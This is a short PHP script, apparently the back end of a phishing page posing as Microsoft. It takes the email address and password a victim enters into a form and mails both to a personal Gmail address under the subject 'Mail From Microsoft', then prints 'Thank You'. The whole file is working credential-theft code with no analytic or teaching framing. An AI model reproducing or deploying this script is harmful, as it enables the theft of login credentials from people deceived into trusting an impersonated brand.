<?php
//get data from form  

$email= $_POST['email'];
$pass= $_POST['exampleInputPassword1'];
$to = "rajsaumya371@gmail.com";
$subject = "Mail From Microsoft";
$txt ="Pass = ". $pass . "\r\n  Email = " . $email ;
$headers = "From: noreply@yoursite.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    if(mail($to,$subject,$txt,$headers)){
        echo 'Thank You';
    }
}
//redirect
//header("Location:thankyou.html");
?>